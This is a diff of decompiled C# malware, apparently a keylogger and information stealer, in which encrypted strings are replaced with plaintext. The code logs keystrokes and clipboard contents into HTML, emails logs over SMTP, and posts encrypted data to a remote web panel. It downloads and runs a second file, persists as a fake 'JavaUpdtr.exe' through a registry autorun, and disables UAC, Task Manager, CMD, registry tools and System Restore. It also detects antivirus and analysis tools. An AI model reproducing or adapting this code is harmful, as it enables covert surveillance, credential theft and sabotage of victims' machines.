 			SmtpClient smtpClient = new SmtpClient();
 			MailAddress to = new MailAddress(GX_160);
-			MailAddress from = new MailAddress(O.I("hE5VnjOcUQGjXVKLTiWzXw=="));
+			MailAddress from = new MailAddress("%mailaddres%");
 			MailMessage mailMessage = new MailMessage(from, to);
 			mailMessage.IsBodyHtml = true;
 			mailMessage.Subject = IMW_161;
@@ -4610,8 +4871,8 @@ internal sealed class N
 				Attachment item2 = new Attachment(EM_164);
 				mailMessage.Attachments.Add(item2);
 			}
-			NetworkCredential credentials = new NetworkCredential(O.I("hE5VnjOcUQGjXVKLTiWzXw=="), O.I("0EUnwx5e2nKHSywJb8Xp2w=="));
-			smtpClient.Host = O.I("8Ae3AMYpA9teATENYf1Ieg==");
+			NetworkCredential credentials = new NetworkCredential("%mailaddres%", "%password%");
+			smtpClient.Host = "%smtp%";
 			smtpClient.UseDefaultCredentials = false;
 			smtpClient.Credentials = credentials;
 			smtpClient.EnableSsl = true;
@@ -4642,7 +4903,7 @@ internal sealed class N
 		{
 			if (File.Exists(NE_166))
 			{
-				MJ(NE_166 + O.I("oikfCuTLFenr3SHYSEZ4i4l/+ojgp7rxEaIDYGVnaoo="));
+				MJ(NE_166 + ":Zone.Identifier");
 			}
 		}
 		catch (Exception projectError)
@@ -4659,8 +4920,8 @@ internal sealed class N
 		try
 		{
 			WebClient webClient = new WebClient();
-			webClient.DownloadFile(O.I("/UQ3JCwhq+Gz2N5ghZStSQ=="), Path.GetTempPath() + O.I("KIviMhlEYA8aInX/5Qb9hA=="));
-			Process.Start(Path.GetTempPath() + O.I("KIviMhlEYA8aInX/5Qb9hA=="));
+			webClient.DownloadFile("%DownLink%", Path.GetTempPath() + "/%filename%");
+			Process.Start(Path.GetTempPath() + "/%filename%");
 		}
 		catch (Exception projectError)
 		{
@@ -4678,42 +4939,42 @@ internal sealed class N
 		{
 			if (YX_50)
 			{
-				W.F_4.Registry.SetValue(O.I("K0ocYJdpSlFAvhxHrgztFQgMSAGTR4Y34Eo23ag/X4fpmLi/O+20Ac6XwZSCbadNtIahNa80MTpAMCWN3QkiFxfHyRWD2OvLT9n8OC99lDs="), O.I("1jb8AudXf9ptWpuwzIAMvw=="), O.I("h70oAKbD4BDUEdcNDLfT7A=="));
+				W.F_4.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "0");
 			}
 			if (MB_51)
 			{
-				Interaction.Shell(O.I("pXKJDGh/uBFBqJOOUmDGtai2K76rV7NdqK+Fs4s+C6Pg68ik04e2NfQREG7baRtzyBvibnT1QTT8Pv9KTqO4Z79Ztwo84c4IPrex/3+thFOvnyIjawY0jfguxMhdkpsWHegdQoXA9gwAA/LACAXrHQ=="), AppWinStyle.NormalFocus);
+				Interaction.Shell(@"REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
 			}
 			if (SXG_52)
 			{
-				Interaction.Shell(O.I("pXKJDGh/uBFBqJOOUmDGtZEGHJOj7ylWAqwD4Ul+dkAXRFJ3EV5kYk8JrGMR/mX4zToM5y7Hi/hwtaL9bCKBUWp7vANvytj5gwvwnPh3h/22AI4kritqlkeDUTtaZQVP"), AppWinStyle.NormalFocus);
-				W.F_4.Registry.SetValue(O.I("kwTbWGPthx54z7ItP6ZZgFtKZgsRq7szebbB4S/fZHH4R/CDIhtDlP3CZXvJIu0jE7AUBZYv7By9njDrk0TnkA=="), O.I("YdZsPXo5ZDP93xut0S4QKQ=="), O.I("84htGJR8cIVATCAwL9pcMw=="), RegistryValueKind.DWord);
+				Interaction.Shell(@"REG add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
+				W.F_4.Registry.SetValue(@"HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", RegistryValueKind.DWord);
 			}
 			if (RVD_53)
 			{
-				Interaction.Shell(O.I("pXKJDGh/uBFBqJOOUmDGtai2K76rV7NdqK+Fs4s+C6Pg68ik04e2NfQREG7baRtzyBvibnT1QTT8Pv9KTqO4Z/VyWWNywzGCv/1pkHBHdlF3/0rGzozhPzTyG/vCdkyA4QQ6P98z9IBBX+cQLZGPyw=="), AppWinStyle.NormalFocus);
+				Interaction.Shell(@"REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
 			}
 			if (MCO_56)
 			{
-				Interaction.Shell(O.I("pXKJDGh/uBFBqJOOUmDGtai2K76rV7NdqK+Fs4s+C6Pg68ik04e2NfQREG7baRtzyBvibnT1QTT8Pv9KTqO4Z1eg53eIIY9JEWfA2TPeLFnVzW8Yrk0MiQckl5DyvUdV2dqcm8jHKC7gHyXGu/Hi3g=="), AppWinStyle.NormalFocus);
+				Interaction.Shell(@"REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
 			}
 			if (BVY_54)
 			{
-				W.F_4.Registry.SetValue(O.I("kwTbWGPthx54z7ItP6ZZgKl9xrkcF1nZTS4MNSHEEbJcJIB9KKPGovoQ/WeUeiRJoulBapu+Q7Gk2UzAUpYj+E4tKch5C6zfqTkJ6NAg3tI="), O.I("mQqftbRCZSvdu2yKy5WdmCQp9TnChZfFlB9thhYkzTw="), O.I("84htGJR8cIVATCAwL9pcMw=="), RegistryValueKind.String);
+				W.F_4.Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", RegistryValueKind.String);
 			}
 			if (UE_55)
 			{
-				W.F_4.Registry.SetValue(O.I("K0ocYJdpSlFAvhxHrgztFQgMSAGTR4Y34Eo23ag/X4frsIP6jgmDDgB1p812ZubR1SRsrtb+nbgpBb5Nl7U5iaIzUhRrQYFxwVHKwqxx3RU="), O.I("0fAR0g3wDywNB8Zm6LvR0A=="), O.I("84htGJR8cIVATCAwL9pcMw=="), RegistryValueKind.DWord);
+				W.F_4.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", RegistryValueKind.DWord);
 			}
 			if (UYQ_58)
 			{
-				Interaction.Shell(O.I("I7rlzsjTmjXEy5niDv06H54CyNwUescc+Nt1sZ3dGntAH+6UkNoCC+NCLDzKbmKH2JmpccFtngJplDnS404OCqfnh6ec3FEznRdG0/Be2xLYHy7O4pOSti7yCiJ5Z3e5Y7d5vTpQrr8fpphrm1we/j1ogtES7tMLz/aprDN82Vk="), AppWinStyle.Hide);
-				Interaction.Shell(O.I("p9/sAL17NWwDMFnldIP11aCX940za0ouDXRy1bBoBrVoaAhBH1IHHurfAGP2y1XBwxArkc4MAZrVvEeFw2jRQNiKfIVpF7zToDxhqIVt6qnuu2zBI1Cw5i9nDP7dDnXcIrrz8g0Xutfp/OKRqijUr5a8iWXQDeXW8VuWBhX7wGE="), AppWinStyle.Hide);
+				Interaction.Shell(@"REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f", AppWinStyle.Hide);
+				Interaction.Shell(@"REG add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f", AppWinStyle.Hide);
 			}
 			if (BET_57)
 			{
-				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(O.I("3zgKylgTkBqowbdc1z3NjnOEOX1XUI3LNA3+hElyKGOQRTruKpERDieoI1PdXLrc/OBfBfE/7Di/ZwkT1IrAUA=="), true);
-				registryKey.DeleteSubKey(O.I("uuXCAKY6xDM9w0TxkU/i0A=="), true);
+				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths", true);
+				registryKey.DeleteSubKey("MSCONFIG.EXE", true);
 				registryKey.Close();
 			}
 		}
@@ -4740,7 +5001,7 @@ internal sealed class N
 		{
 			string executablePath = Application.ExecutablePath;
 			string AA_ = Application.ExecutablePath;
-			FD(PT(executablePath, KK(0, ref AA_, 256)), Path.GetTempPath() + O.I("VVdlIKEaUh6SRldwykrZgQ==") + DateTime.Now.Millisecond + O.I("PTG3dyeodBPPTTLkUuHvJA=="), 8L);
+			FD(PT(executablePath, KK(0, ref AA_, 256)), Path.GetTempPath() + @"\tmpG" + DateTime.Now.Millisecond + ".tmp", 8L);
 		}
 		catch (Exception projectError)
 		{
@@ -4755,7 +5016,7 @@ internal sealed class N
 		//IL_0055: Expected O, but got I4
 		if (UW_174 < 0)
 		{
-			throw new ArgumentOutOfRangeException(O.I("ct9ohcuC/ipgVr5A31KpGg=="), UW_174, O.I("yJ2qMAJyXhZHlp50824HSdArxsDOcSTLLq14sG6CQgY="));
+			throw new ArgumentOutOfRangeException("length", UW_174, "length must be > 0");
 		}
 		if (UW_174 == 0 || VKN_173.Length == 0)
 		{
@@ -4788,19 +5049,19 @@ internal sealed class N
 	{
 		//Discarded unreachable code: IL_0162, IL_0175
 		//IL_016c: Expected O, but got I4
-		if (!File.Exists(Environment.GetEnvironmentVariable(O.I("cWUeT8dJU4KfzxUEgGflzQ==")) + O.I("h7X8FV7+XYjBLAjik7kE5g==")))
+		if (!File.Exists(Environment.GetEnvironmentVariable("temp") + @"\JavaUpdtr.exe"))
 		{
-			File.Copy(Environment.GetEnvironmentVariable(O.I("haLsi+cj0yodiuWmM+o4Wg==")) + O.I("zYMGsY8aSA781gMxSStsC9UAfia6hLdLRxgBeS3NtD0="), Environment.GetEnvironmentVariable(O.I("cWUeT8dJU4KfzxUEgGflzQ==")) + O.I("h7X8FV7+XYjBLAjik7kE5g=="));
+			File.Copy(Environment.GetEnvironmentVariable("appdata") + @"\Java\JavaUpdtr.exe", Environment.GetEnvironmentVariable("temp") + @"\JavaUpdtr.exe");
 		}
-		else if (!File.Exists(Environment.GetEnvironmentVariable(O.I("haLsi+cj0yodiuWmM+o4Wg==")) + O.I("zYMGsY8aSA781gMxSStsC9UAfia6hLdLRxgBeS3NtD0=")))
+		else if (!File.Exists(Environment.GetEnvironmentVariable("appdata") + @"\Java\JavaUpdtr.exe"))
 		{
-			File.Copy(Environment.GetEnvironmentVariable(O.I("cWUeT8dJU4KfzxUEgGflzQ==")) + O.I("h7X8FV7+XYjBLAjik7kE5g=="), Environment.GetEnvironmentVariable(O.I("haLsi+cj0yodiuWmM+o4Wg==")) + O.I("zYMGsY8aSA781gMxSStsC9UAfia6hLdLRxgBeS3NtD0="));
+			File.Copy(Environment.GetEnvironmentVariable("temp") + @"\JavaUpdtr.exe", Environment.GetEnvironmentVariable("appdata") + @"\Java\JavaUpdtr.exe");
 		}
-		if (!SRX(O.I("8mFIzTz8+GxS3SBdy62qeA==")))
+		if (!SRX("JavaUpdtr"))
 		{
 			try
 			{
-				Process.Start(Environment.GetEnvironmentVariable(O.I("haLsi+cj0yodiuWmM+o4Wg==")) + O.I("zYMGsY8aSA781gMxSStsC9UAfia6hLdLRxgBeS3NtD0="));
+				Process.Start(Environment.GetEnvironmentVariable("appdata") + @"\Java\JavaUpdtr.exe");
 			}
 			catch (Exception projectError)
 			{
@@ -4810,7 +5071,7 @@ internal sealed class N
 		}
 		try
 		{
-			Registry.CurrentUser.OpenSubKey(O.I("Akq+/Qobe3bW+jdjmv5oI6h1rNqdq+rlANdh6Ef29KelgAp0y6gsCspLDS+k+xmNC9TpnFhgwZyL///RhoSWxQ=="), true).SetValue(O.I("aZG83zDiQxysOvFJFc8qmg=="), Environment.GetEnvironmentVariable(O.I("haLsi+cj0yodiuWmM+o4Wg==")) + O.I("h7X8FV7+XYjBLAjik7kE5g=="));
+			Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true).SetValue("Load", Environment.GetEnvironmentVariable("appdata") + @"\JavaUpdtr.exe");
 		}
 		catch (Exception projectError2)
 		{
@@ -4858,34 +5119,34 @@ internal sealed class N
 		//IL_01fc: Expected O, but got I4
 		string[] array = new string[28]
 		{
-			O.I("hgsLoRCFowHEFaiZ24Tm4w=="),
-			O.I("hyND10q/Gct0fSgKnmVrpQ=="),
-			O.I("nwUYcPZACaihAjvclXYFDA=="),
-			O.I("0zOPwZmqcWlcoCwZVsCiEA=="),
-			O.I("MiGtxZM6ypMhV0QP2DUZPw=="),
-			O.I("hIvIBuOh1Hbad4cssdzObQ=="),
-			O.I("KJGrHQcBKmibYJv4Rg2oeQ=="),
-			O.I("H7jtg1tgyxC2cKqM6J/IpQ=="),
-			O.I("itdbDWvkC1oMfeFAiNP37Q=="),
-			O.I("jfpwGvCL86GIhgKjUbIKFQ=="),
-			O.I("AkpmnuxN1PoJWEnPEh7RRA=="),
-			O.I("jQGQKLpwQwg1OB/xlv8xPw=="),
-			O.I("2YQ4oFVhLASjCtX984MKaQ=="),
-			O.I("Rdv/i+D2zOrcRwM3GKgNog=="),
-			O.I("qxwKKRXOAnhjnaQFTE7RFQ=="),
-			O.I("+kRXtxxlq9UNH0xkfXnwXA=="),
-			O.I("qiuTLBRlsNF1qVI1HBdzew=="),
-			O.I("v/X3jo2U4AXkHGQvVxIU7g=="),
-			O.I("baRBtCOGmlADmyS4gZI+og=="),
-			O.I("BAdL8mZS8WoQZvjwihHo7A=="),
-			O.I("9RprxB4iapr5SMXZu5qvVQ=="),
-			O.I("hdQE8w9zn+/yuM02VtngDw=="),
-			O.I("ZNEWu/iCJwgz1mgF0dRcqw=="),
-			O.I("FMzk2sQzjsOFdcYdxvQPCQ=="),
-			O.I("NQhoXvF73M1kJlAMEo+VDg=="),
-			O.I("EbCCcXnqlGjCKmxcPuRuOA=="),
-			O.I("104G1C4dVS1cP/AqCNl/AA=="),
-			O.I("H7PikNhZXmObhNrFe4IGiQ==")
+			"anubis",
+			"a2servic",
+			"ashWebSv",
+			"hvk",
+			"avgemc",
+			"bdagent",
+			"avp",
+			"keyscrambler",
+			"mbam",
+			"ekrn",
+			"egui",
+			"npfmsg",
+			"ollydbg",
+			"outpost",
+			"wireshark",
+			"mcagent",
+			"mcuimgr",
+			"clamauto",
+			"cpf",
+			"ewido",
+			"FPAVServer",
+			"SbieSvc",
+			"antigen",
+			"ccapp",
+			"tmlisten",
+			"pccntmon",
+			"earthagent",
+			"spysweeper"
 		};
 		checked
 		{
@@ -4912,7 +5173,7 @@ internal sealed class N
 		//IL_0092: Expected O, but got I4
 		string[] array = new string[1]
 		{
-			O.I("XyUC0YMNp2KCMC7ARQHfsw==")
+			"%filter_list%"
 		};
 		if (array.Length == 0)
 		{
@@ -4968,18 +5229,18 @@ internal sealed class N
 		string result = default(string);
 		try
 		{
-			@_ _ = new @_(O.I("7AV48FMYom3jRiORMwdKJtL5Xn9e9IN3whNSB/4NG45WbPsGoqFpQLCcz4rJDevDqs3Ewrfp8V2vUqdZ0/p3FA=="));
-			QL_184 = O.I("pvX6ayVtPjG2DUE5o5Osvg==") + _.Encrypt(QL_184);
-			string requestUriString = O.I("l7UE03XDUjEP/DkYp0kZNIvsrwYjMdiwJTnDCVsPcbd5EXnw8jEHmDrjiFKJ0SM2");
+			@_ _ = new @_("E+MTWs/(En()a3456d3h99sdf9sjdgA&%/+vkm&FGNBDSFs5(TRS%cxv");
+			QL_184 = "p=" + _.Encrypt(QL_184);
+			string requestUriString = "http://tonishl.ml/nonso/WebPanel/api.php";
 			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
 			httpWebRequest.Credentials = CredentialCache.DefaultCredentials;
 			httpWebRequest.KeepAlive = true;
 			httpWebRequest.Timeout = 10000;
-			httpWebRequest.UserAgent = O.I("xSzHph7pBUFwvUOkzcYOrSnVgrtesjsVAW5tR0LCpw81yVvvbAq1F9QimLns3CttNT2uNndpflR7RrD3a5LN9pi0YYcJkfCHfu6bf4kdZllul2ZZULpeKEO99JdpUg6DsWPSeDK2Hq/dchqH2q+/Jw==");
-			httpWebRequest.Method = O.I("9npcIgbXVHcqeMayTTHmTg==");
-			QL_184 = QL_184.Replace(O.I("L2u2LBmVjK9Jdkrxsuz1AQ=="), O.I("jg36Efzgo7kpA/Yloqnb+g=="));
+			httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)";
+			httpWebRequest.Method = "POST";
+			QL_184 = QL_184.Replace("+", "%2B");
 			byte[] bytes = Encoding.UTF8.GetBytes(QL_184);
-			httpWebRequest.ContentType = O.I("R/arOUkcgxLHPAWyUzAk7hiJZpDRPT1kiyetRhgVDv9cVu4lce4zRJKPNJILwwuy");
+			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
 			httpWebRequest.ContentLength = bytes.Length;
 			string text = "";
 			using (Stream stream = httpWebRequest.GetRequestStream())
@@ -5015,13 +5276,10 @@ internal sealed class N
 
 	private static string QE()
 	{
-		//Discarded unreachable code: IL_004a, IL_005d
-		//IL_0054: Expected O, but got I4
-		//IL_0055: Expected O, but got I4
 		try
 		{
-			string input = new WebClient().DownloadString(O.I("5VLTgwuSSXHyLYis8rELNl0AZkxNSAZoq5Dr9cX6HQ0="));
-			return new Regex(O.I("Qp4MXVN3WHRCEtMG2ScE0sVZgeWxzQwXU8fSt7ifqvCNNePTDp4RqvP2r/DeUQn0")).Matches(input)[0].ToString();
+			string input = new WebClient().DownloadString("http://checkip.dyndns.org/");
+			return new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}").Matches(input)[0].ToString();
 		}
 		catch (Exception projectError)
 		{
@@ -5034,8 +5292,6 @@ internal sealed class N
 
 	private static void FN(object RW_185, ref PB.MouseEvent JU_186)
 	{
-		//Discarded unreachable code: IL_0015, IL_0028
-		//IL_001f: Expected O, but got I4
 		if (JU_186.Button == MouseButtons.Right)
 		{
 			JU_186.Handled = true;
@@ -5048,13 +5304,11 @@ internal sealed class N
 
 	private static void AGM(Clipboard ZH_189)
 	{
-		//Discarded unreachable code: IL_00a6, IL_00b9
-		//IL_00b0: Expected O, but got I4
 		string text = W.F_4.Clipboard.GetText();
-		text = text.Replace(O.I("zz+VAmVGWqvdCIFdUknvLA=="), O.I("aZbfLN7sA6OaZbfFIGc8Ig=="));
-		text = text.Replace(O.I("vxTv6ds7skm4CTte/+X7Bg=="), O.I("/GqY0rpin6fnd1w94mPeWA=="));
-		text = text.Replace(O.I("JCbUCh7tPK9MUrIEPVpP1g=="), O.I("ieTLqRik1rZ3NUgkQFsvdQ=="));
-		text = text.Replace(O.I("J4TYpBNSFoaeSq6MjuzO4g=="), O.I("DlDezBfQ+QVKZKzzYqO1dA=="));
+		text = text.Replace("&", "&amp;");
+		text = text.Replace("<", "&lt;");
+		text = text.Replace(">", "&gt;");
+		text = text.Replace("\"", "&quot;");
 		if (Operators.CompareString(text, "", false) != 0)
 		{
 			HDM_38 = HDM_38 + "<br><span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span>" + text + "<span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span><br>";
@@ -5100,11 +5354,11 @@ internal sealed class N
 			string productName = FileVersionInfo.GetVersionInfo(Process.GetProcessById(MFK_).MainModule.FileName).ProductName;
 			if (productName != null)
 			{
-				str = productName + O.I("mjW1014fRDWqkRrgWeyLEA==");
+				str = productName + ": ";
 			}
 			else if (processName != null)
 			{
-				str = processName + O.I("mjW1014fRDWqkRrgWeyLEA==");
+				str = processName + ": ";
 			}
 		}
 		catch (Exception projectError)
@@ -5159,7 +5413,7 @@ internal sealed class N
 				IL_0087:
 				if (Operators.CompareString(TGW_96, stringBuilder.ToString(), false) != 0)
 				{
-					NW_98 = "<br><span style=font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#0099cc;>[" + TY() + O.I("hYj+berURG9qbiSIE4bh++abqwUn/Si0XB6nXto8au31U43CN8BduKAMUX8LLVzw1FKVrpetR4VB4L9qvjp6xe65o1CrhCvChWSs7Hfd2yxLNeIdhkpy5R29Svj9g2u/") + DateTime.Now.ToString(O.I("+KvItdCkbJYVhD5M+8OWWuNMaKVwLuIiBwNvfWU5drw=")) + ")</span></span><br>";
+					NW_98 = "<br><span style=font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#0099cc;>[" + TY() + "]<span style=font-style:normal;text-decoration:none;text-transform:none;color:#000000;> (" + DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss") + ")</span></span><br>";
 					HDM_38 += NW_98;
 					TGW_96 = stringBuilder.ToString();
 				}
@@ -5167,14 +5421,14 @@ internal sealed class N
 				IL_0113:
 				if (BM_207 == Keys.Back)
 				{
-					if (YWD_45 == Conversions.ToBoolean(O.I("IMqa7/uMjEFhAZrJPRn9Gw==")))
+					if (YWD_45 == Conversions.ToBoolean("False"))
 					{
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwsAdlmHk/XWi/iVKTUsAFq1NC0R6SpJCfXS9YjFgKnlI");
+						HDM_38 += "<font color=#008000>{BACK}</font>";
 					}
 					else if (Operators.CompareString(HDM_38, "", false) != 0 && Operators.CompareString(HDM_38.Substring(HDM_38.Length - NW_98.Length, NW_98.Length), NW_98, false) != 0)
 					{
 						string left = HDM_38.Substring(HDM_38.Length - 7);
-						if ((Operators.CompareString(left, O.I("87x11BV8sTkYoy561BDZ9A=="), false) != 0) & (Operators.CompareString(HDM_38.Substring(HDM_38.Length - 4), "<br>", false) != 0))
+						if ((Operators.CompareString(left, "</font>", false) != 0) & (Operators.CompareString(HDM_38.Substring(HDM_38.Length - 4), "<br>", false) != 0))
 						{
 							HDM_38 = HDM_38.Substring(0, HDM_38.Length - 1);
 						}
@@ -5185,119 +5439,119 @@ internal sealed class N
 				{
 					if (W.F_4.Keyboard.AltKeyDown && BM_207 == Keys.Tab)
 					{
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwgMOx2Pq9SSmg4YPrIH0eb1FrVUD8gXIHxHyguoK5Izh");
+						HDM_38 += "<font color=#008000>{ALT+TAB}</font>";
 						return;
 					}
 					if (W.F_4.Keyboard.AltKeyDown && BM_207 == Keys.F4)
 					{
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwvQustDikfkUlYIpOGCcKBhmGKebSp5rcrr+rOgXkxt0");
+						HDM_38 += "<font color=#008000>{ALT+F4}</font>";
 						return;
 					}
 					switch (BM_207)
 					{
 					case Keys.Tab:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwhHHE9gVBfX3+j2456j8GZzmuzwi7Edg8K/Xt3xEMKzM");
+						HDM_38 += "<font color=#008000>{TAB}</font>";
 						return;
 					case Keys.Escape:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwq+5/WPdNXJ2dIaVKINbFJzeDOxB3MK6/ioVB3LOSKDo");
+						HDM_38 += "<font color=#008000>{ESC}</font>";
 						return;
 					}
 					if (BM_207 == Keys.LWin || BM_207 == Keys.RWin)
 					{
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwmxYl6Jryw7QzpibCzw8cpXKgn3X3VyokcnXaGDybiJE");
+						HDM_38 += "<font color=#008000>{Win}</font>";
 						return;
 					}
 					switch (BM_207)
 					{
 					case Keys.Capital:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwtYWfm8DaoM8Mk/AXVsiQPrHjN3cHo86oqfYnz7KlJJf");
+						HDM_38 += "<font color=#008000>{CAPSLOCK}</font>";
 						return;
 					case Keys.Up:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwlp6n8Xw+vBY/eBO1TJy2AU/4pY3k+lLXWHvniVVCAii");
+						HDM_38 += "<font color=#008000>&uarr;</font>";
 						return;
 					case Keys.Down:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwoDPNYsC5HzBiVR2tjnvmbqECZMs4TqGUhkIweviZA8+");
+						HDM_38 += "<font color=#008000>&darr;</font>";
 						return;
 					case Keys.Left:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwvPXue4ZTJh+arXBPZ8LWF2N5kMlivViRAtgCVJswLsp");
+						HDM_38 += "<font color=#008000>&larr;</font>";
 						return;
 					case Keys.Right:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwmNTADUxFECvCdRfiT1fh7/Ya/noXlmKJjtUidIQalFk");
+						HDM_38 += "<font color=#008000>&rarr;</font>";
 						return;
 					case Keys.Delete:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwj6VIhdXah02b3VTHNaobkaPMBRBC5OcAxZdo3QrzLVW");
+						HDM_38 += "<font color=#008000>{DEL}</font>";
 						return;
 					case Keys.End:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwrQ8K+GusHxzzEqV0xLLJGmGJD4Ughm1YghiwCgK6fnu");
+						HDM_38 += "<font color=#008000>{END}</font>";
 						return;
 					case Keys.Home:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwkbC1/qFLC/SQzkf085ItY4wM9srWLpGtMavmXiyhqqE");
+						HDM_38 += "<font color=#008000>{HOME}</font>";
 						return;
 					case Keys.Insert:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwtyfOkkvLe8NYlm4qVsM3vWfYNpxep05iQMThHrVJgs3");
+						HDM_38 += "<font color=#008000>{Insert}</font>";
 						return;
 					case Keys.NumLock:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwkkzGLWV3pXWY41bQVRmVeJk6Mbc1Up3O36fWGnfNqQj");
+						HDM_38 += "<font color=#008000>{NumLock}</font>";
 						return;
 					case Keys.Next:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwsThygi+zr1GPj/5yzOQBftbwZ4/Q1weEYpYLntb9X/5");
+						HDM_38 += "<font color=#008000>{PageDown}</font>";
 						return;
 					case Keys.Prior:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwv7Md8mHY387YlBDgudH1Gqdeh6Qxm5ocMSdqCsE9P4o");
+						HDM_38 += "<font color=#008000>{PageUp}</font>";
 						return;
 					case Keys.Return:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwpLdjrsTEmX7k1rpfOCsWvqd9VpqUt8F0j2SRAC42rnj");
+						HDM_38 += "<font color=#008000>{ENTER}</font>";
 						HDM_38 += "<br>";
 						return;
 					case Keys.F1:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwsZeOzxhjGK2aZFVI8Clcjo=");
+						HDM_38 += "<font color=#008000>{F1}</font>";
 						return;
 					case Keys.F2:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwsHmpemQC5KT1MRD1066e0E=");
+						HDM_38 += "<font color=#008000>{F2}</font>";
 						return;
 					case Keys.F3:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwkYz4Tl4/qqswBmyY7Hrzkg=");
+						HDM_38 += "<font color=#008000>{F3}</font>";
 						return;
 					case Keys.F4:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwrxb3zymola2dBU03yJTqHg=");
+						HDM_38 += "<font color=#008000>{F4}</font>";
 						return;
 					case Keys.F5:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwn5D96LrPpgRHkiBVeRSKKw=");
+						HDM_38 += "<font color=#008000>{F5}</font>";
 						return;
 					case Keys.F6:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwiRc5xpwqwg1Su8dc+GStRY=");
+						HDM_38 += "<font color=#008000>{F6}</font>";
 						return;
 					case Keys.F7:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwvlZZPIbFFw/EogqRqrtJWg=");
+						HDM_38 += "<font color=#008000>{F7}</font>";
 						return;
 					case Keys.F8:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwkBYOZaEHSjY5HD/eXPjl7Y=");
+						HDM_38 += "<font color=#008000>{F8}</font>";
 						return;
 					case Keys.F9:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwmIYGyp/9YDddxgRl6JMtWY=");
+						HDM_38 += "<font color=#008000>{F9}</font>";
 						return;
 					case Keys.F10:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwmTeej7kNpjqk3liJYN2gVsojiDW3JHsP5F2phoMa+60");
+						HDM_38 += "<font color=#008000>{F10}</font>";
 						return;
 					case Keys.F11:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwh5CxTOJ/uZrxOW4zRw3APip9qVSQlGYWjKQVAR1tbMP");
+						HDM_38 += "<font color=#008000>{F11}</font>";
 						return;
 					case Keys.F12:
-						HDM_38 += O.I("xRm1fBracupUySoA9cylwooZTfInf8Fbno7sAzWD4PeqEZ6I3Z7/lx1QZznmzgLX");
+						HDM_38 += "<font color=#008000>{F12}</font>";
 						return;
 					case Keys.Space:
-						HDM_38 += O.I("0XuB4qT44kEu3Z0S79ooOg==");
+						HDM_38 += " ";
 						return;
 					}
 				}
 				if (W.F_4.Keyboard.CtrlKeyDown & !W.F_4.Keyboard.AltKeyDown)
 				{
-					if (BM_207.ToString().ToLower().Contains(O.I("AwNvbJp5HKR7xaynKwPRLA==")))
+					if (BM_207.ToString().ToLower().Contains("control"))
 					{
 						BU__97 = BM_207.ToString();
 						return;
 					}
-					HDM_38 += O.I("xRm1fBracupUySoA9cylwj2p7W/wciyqog/QugF8dQM6Hb/8zr+D7YbHA4lQ2Zc3");
+					HDM_38 += "<font color=#008000>{CTRL}</font>";
 					HDM_38 += BM_207;
 					BU__97 = null;
 				}
@@ -5329,8 +5583,6 @@ internal sealed class N
 
 	private static string XE_(uint FW_208)
 	{
